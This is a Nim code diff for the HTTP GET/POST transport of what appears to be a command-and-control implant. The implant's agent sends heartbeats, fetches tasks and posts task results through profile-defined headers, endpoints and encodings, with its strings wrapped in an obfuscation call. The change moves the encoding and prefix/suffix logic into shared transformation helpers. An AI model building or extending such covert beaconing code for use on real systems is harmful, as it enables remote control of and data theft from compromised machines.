@@ -5,16 +5,10 @@ import ../../common/[types, utils, profile]
 proc httpGet*(ctx: AgentCtx, heartbeat: seq[byte]): string = 
 
     let client = newAsyncHttpClient(userAgent = ctx.profile.getString(protect("http-get.user-agent")))
-    var heartbeatString: string
-
-    # Apply data transformation to the heartbeat bytes
-    case ctx.profile.getString(protect("http-get.agent.heartbeat.encoding.type"), default = protect("none"))
-    of protect("base64"):
-        heartbeatString = encode(heartbeat, safe = ctx.profile.getBool(protect("http-get.agent.heartbeat.encoding.url-safe"))).replace("=", "")
-    of protect("hex"):
-        heartbeatString = Bytes.toString(heartbeat).toHex().toLowerAscii() 
-    of protect("none"): 
-        heartbeatString = Bytes.toString(heartbeat)
+    
+    # Apply data transformation
+    let payload = ctx.profile.applyDataTransformation(protect("http-get.agent.heartbeat"), heartbeat)
+    var body: string = ""
 
     # Define request headers, as defined in profile
     for header, value in ctx.profile.getTable(protect("http-get.agent.headers")): 
@@ -24,12 +18,6 @@ proc httpGet*(ctx: AgentCtx, heartbeat: seq[byte]): string =
     var endpoint = ctx.profile.getString(protect("http-get.endpoints"))
     if endpoint[0] == '/': 
         endpoint = endpoint[1..^1] & "?"    # Add '?' for additional GET parameters
-
-    let 
-        prefix = ctx.profile.getString(protect("http-get.agent.heartbeat.prefix"))
-        suffix = ctx.profile.getString(protect("http-get.agent.heartbeat.suffix"))
-        payload = prefix & heartbeatString & suffix
-    var body = ""
 
     # Add heartbeat packet to the request
     case ctx.profile.getString(protect("http-get.agent.heartbeat.placement.type")): 
@@ -63,17 +51,8 @@ proc httpGet*(ctx: AgentCtx, heartbeat: seq[byte]): string =
         if responseBody.len() <= 0: 
             return ""
 
-        # In case that tasks are found, apply data transformation to server's response body to get thr raw data
-        let 
-            prefix = ctx.profile.getString(protect("http-get.server.output.prefix"))
-            suffix = ctx.profile.getString(protect("http-get.server.output.suffix"))
-            encResponse = responseBody[len(prefix) ..^ len(suffix) + 1]
-
-        case ctx.profile.getString(protect("http-get.server.output.encoding.type"), default = protect("none")): 
-        of protect("base64"):
-            return decode(encResponse) 
-        of protect("none"):
-            return encResponse 
+        # Reverse data transformation
+        return Bytes.toString(ctx.profile.reverseDataTransformation(protect("http-get.server.output"), responseBody)) 
 
     except CatchableError as err:
         # When the listener is not reachable, don't kill the application, but check in at the next time
@@ -100,21 +79,8 @@ proc httpPost*(ctx: AgentCtx, data: seq[byte]): bool {.discardable.} =
     let requestMethod = parseEnum[HttpMethod](ctx.profile.getString(protect("http-post.request-methods"), protect("POST")))
 
     # Apply data transformation
-    var output: string
-    case ctx.profile.getString(protect("http-post.agent.output.encoding.type"), default = protect("none"))
-    of protect("base64"): 
-        output = encode(data, safe = ctx.profile.getBool(protect("http-post.agent.output.encoding.url-safe"))).replace("=", "")
-    of protect("hex"):
-        output = Bytes.toString(data).toHex().toLowerAscii() 
-    of protect("none"): 
-        output = Bytes.toString(data)
-    
-    # Append/prepend strings
-    let 
-        prefix = ctx.profile.getString(protect("http-post.agent.output.prefix"))
-        suffix = ctx.profile.getString(protect("http-post.agent.output.suffix"))
-        payload = prefix & output & suffix
-    var body: string
+    let payload = ctx.profile.applyDataTransformation(protect("http-post.agent.output"), data)
+    var body: string = ""
 
     # Add task result to the request
     case ctx.profile.getString(protect("http-post.agent.output.placement.type")): 
